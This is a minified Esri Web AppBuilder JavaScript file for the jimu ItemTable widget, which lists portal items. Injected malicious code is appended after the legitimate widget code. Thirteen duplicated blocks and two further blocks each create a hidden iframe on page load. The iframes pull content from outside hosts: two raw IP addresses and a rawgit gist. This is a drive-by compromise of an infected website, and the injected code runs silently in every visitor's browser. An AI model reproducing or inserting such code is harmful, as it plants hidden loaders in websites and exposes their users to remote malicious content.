// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/templates/_ItemTable.html":'\x3cdiv\x3e\r\n\t\x3cdiv class\x3d"items-section all-items-section" data-dojo-attach-point\x3d"allItemsSection"\x3e\r\n\t\t\x3cdiv class\x3d"items-table-div" data-dojo-attach-point\x3d"allItemsTableDiv" data-dojo-attach-event\x3d"onscroll:_onAllItemsSectionScroll"\x3e\r\n\t\t\t\x3ctable class\x3d"items-table" cellpadding\x3d"10" data-dojo-attach-point\x3d"allItemsTable" data-dojo-attach-event\x3d"onclick:_onItemsTableClicked"\x3e\r\n\t\t\t\t\x3ctbody data-dojo-attach-point\x3d"allItemTbody"\x3e\x3c/tbody\x3e\r\n\t\t\t\x3c/table\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv data-dojo-type\x3d"jimu/dijit/LoadingIndicator" data-dojo-attach-point\x3d"allItemsShelter" data-dojo-props\x3d\'hidden:true\'\x3e\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv class\x3d"items-section filtered-items-section" data-dojo-attach-point\x3d"filteredItemsSection"\x3e\r\n\t\t\x3cdiv class\x3d"items-table-div" data-dojo-attach-point\x3d"filteredItemsTableDiv" data-dojo-attach-event\x3d"onscroll:_onFilteredItemsSectionScroll"\x3e\r\n\t\t\t\x3ctable class\x3d"items-table" cellpadding\x3d"10" data-dojo-attach-point\x3d"filteredItemsTable" data-dojo-attach-event\x3d"onclick:_onItemsTableClicked"\x3e\r\n\t\t\t\t\x3ctbody data-dojo-attach-point\x3d"filteredItemsTbody"\x3e\x3c/tbody\x3e\r\n\t\t\t\x3c/table\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"search-none-tip-section" data-dojo-attach-point\x3d"searchNoneTipSection" style\x3d"display:none;"\x3e\r\n\t\t\t\x3cspan class\x3d"search-none-icon jimu-icon jimu-icon-error"\x3e\x3c/span\x3e\r\n\t\t\t\x3cspan class\x3d"search-none-tip jimu-state-error-text"\x3e${nls.searchNone}\x3c/span\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv data-dojo-type\x3d"jimu/dijit/LoadingIndicator" data-dojo-attach-point\x3d"filteredItemShelter" data-dojo-props\x3d\'hidden:true\'\x3e\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/_ItemTable.html dojo/Evented dojo/_base/lang dojo/_base/array dojo/_base/html dojo/_base/Deferred dojo/query dojo/on jimu/utils jimu/portalUtils jimu/portalUrlUtils jimu/dijit/LoadingIndicator".split(" "),function(q,r,t,u,v,w,e,n,b,A,g,B,x,p,y,C){return q([r,t,u,w],{templateString:v,declaredClass:"jimu.dijit.ItemTable",baseClass:"jimu-item-table",query:null,filteredQuery:null,portalUrl:null,
hidden:!1,nls:null,types:"",typeKeywords:"",_defaultThumbnail:{"Web Mapping Application":"webapp.png","Mobile Application":"mobileapp.png"},postMixInProperties:function(){this.nls=window.jimuNls.itemSelector},postCreate:function(){this.inherited(arguments);this._initSelf()},_initSelf:function(){this.types&&0<this.types.length||(this.types=[]);(this.hidden=!0===this.hidden)&&this.hide();this.portalUrl&&(this.portalUrl=y.getStandardPortalUrl(this.portalUrl));this.showAllItemsSection();this.searchAllItems()},
show:function(){b.setStyle(this.domNode,"display","block")},hide:function(){b.setStyle(this.domNode,"display","none")},searchAllItems:function(a){this.showAllItemsSection();a&&(this.query=e.mixin({},a),this.query.start=1,this.clearAllItemsSection());this.portalUrl&&this.query&&0<this.query.start&&(this.allItemsShelter.show(),p.getPortal(this.portalUrl).queryItems(this.query).then(e.hitch(this,function(a){this.domNode&&(this.allItemsShelter.hide(),this.query.start=a.nextStart,this._createItems(a,this.allItemTbody))}),
e.hitch(this,function(a){console.error(a);this.domNode&&this.allItemsShelter.hide()})))},searchFilteredItems:function(a){this.showFilterItemsSection();a&&(this.filteredQuery=e.clone(a),this.filteredQuery.start=1,this.clearFilteredItemsSection());this.portalUrl&&this.filteredQuery&&0<this.filteredQuery.start&&(this.filteredItemShelter.show(),p.getPortal(this.portalUrl).queryItems(this.filteredQuery).then(e.hitch(this,function(b){this.domNode&&(this.showFilterItemsSection(),a&&this.clearFilteredItemsSection(),
this.filteredQuery.start=b.nextStart,this._createItems(b,this.filteredItemsTbody),this._filterItemCallback())}),e.hitch(this,function(a){console.error(a);this.domNode&&this._filterItemCallback()})))},_filterItemCallback:function(){this.filteredItemShelter.hide();0<this._getItemCount(this.filteredItemsTbody)?(b.setStyle(this.filteredItemsTableDiv,"display","block"),b.setStyle(this.searchNoneTipSection,"display","none")):(b.setStyle(this.filteredItemsTableDiv,"display","none"),b.setStyle(this.searchNoneTipSection,
"display","block"))},clear:function(){this.clearAllItemsSection();this.clearFilteredItemsSection()},clearAllItemsSection:function(){b.empty(this.allItemTbody)},clearFilteredItemsSection:function(){b.empty(this.filteredItemsTbody)},showAllItemsSection:function(){b.setStyle(this.allItemsSection,"display","block");b.setStyle(this.filteredItemsSection,"display","none")},showFilterItemsSection:function(){b.setStyle(this.allItemsSection,"display","none");b.setStyle(this.filteredItemsSection,"display","block");
b.setStyle(this.filteredItemsTableDiv,"display","block");b.setStyle(this.searchNoneTipSection,"display","none")},_onAllItemsSectionScroll:function(){this._isScrollToBottom(this.allItemsTableDiv)&&this.searchAllItems()},_onFilteredItemsSectionScroll:function(){this._isScrollToBottom(this.filteredItemsTableDiv)&&this.searchFilteredItems()},_isScrollToBottom:function(a){return x.isScrollToBottom(a)},_createItems:function(a,c){a=a.results;var z=n.map(this.types,e.hitch(this,function(a){return a.toLowerCase()}));
a=n.filter(a,e.hitch(this,function(a){a=a.type&&a.type.toLowerCase()||"";return 0<=n.indexOf(z,a)}));if(0!==a.length){var f,h=g("td.empty",c),d;if(0<h.length){var k=Math.min(a.length,h.length),l=a.splice(0,k);for(d=0;d<k;d++){var m=h[d];f=this._createItem(l[d]);b.place(f,m);b.removeClass(m,"empty")}}if(0!==a.length){h=Math.ceil(a.length/2);for(d=0;d<h;d++)for(f=b.toDom("\x3ctr\x3e\x3ctd\x3e\x3c/td\x3e\x3ctd\x3e\x3c/td\x3e\x3c/tr\x3e"),b.place(f,c),k=g("td",f),l=0;l<k.length;l++)m=k[l],(f=a[2*d+l])?
(f=this._createItem(f),b.place(f,m)):b.addClass(m,"empty");this.emit("update")}}},_getItemCount:function(a){return g(".item",a).length},_createItem:function(a){var c=b.toDom('\x3cdiv class\x3d"item"\x3e\x3cdiv class\x3d"item-border"\x3e\x3c/div\x3e\x3cdiv class\x3d"item-thumbnail jimu-auto-vertical"\x3e\x3cdiv class\x3d"none-thumbnail-tip jimu-auto-vertical-content"\x3e\x3c/div\x3e\x3c/div\x3e\x3cdiv class\x3d"item-info"\x3e\x3cdiv class\x3d"item-name"\x3e\x3c/div\x3e\x3cdiv class\x3d"item-type-owner"\x3e\x3c/div\x3e\x3cdiv class\x3d"item-date"\x3e\x3c/div\x3e\x3ca class\x3d"item-details" target\x3d"_blank"\x3e\x3c/a\x3e\x3c/div\x3e\x3c/div\x3e');
c.item=a;var e=g(".item-thumbnail",c)[0],f=g(".item-name",c)[0],h=g(".item-type-owner",c)[0],d=g(".item-date",c)[0],k=g(".item-details",c)[0],l=g(".none-thumbnail-tip",c)[0];if(!a.thumbnailUrl){var m=this._defaultThumbnail[a.type];m&&(a.thumbnailUrl=require.toUrl("jimu")+"/images/"+m)}a.thumbnailUrl?b.setStyle(e,"backgroundImage","url("+a.thumbnailUrl+")"):l.innerHTML=this.nls.noneThumbnail;"function"===typeof this.onCreateItemContent?(d=g(".item-info",c)[0],this.onCreateItemContent(a,d)):(f.innerHTML=
a.title,f.title=f.innerHTML,h.innerHTML=a.type+" by "+a.owner,h.title=h.innerHTML,e=new Date,e.setTime(a.modified),d.innerHTML=e.toLocaleString(),d.title=d.innerHTML,k.innerHTML=this.nls.moreDetails,k.href=a.detailsPageUrl||"#");return c},_onItemsTableClicked:function(a){var c=a.target||a.srcElement;a=null;b.hasClass(c,"item-thumbnail")?a=c.parentNode:b.hasClass(c,"none-thumbnail-tip")&&(a=c.parentNode.parentNode);a&&(c=b.hasClass(a,"jimu-state-active"),g(".item.jimu-state-active",this.domNode).removeClass("jimu-state-active"),
c?b.removeClass(a,"jimu-state-active"):b.addClass(a,"jimu-state-active"),this.emit("item-dom-clicked",a))},getSelectedItem:function(){var a=null,b=g(".item.jimu-state-active",this.domNode);0<b.length&&(a=e.mixin({},b[0].item));return a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});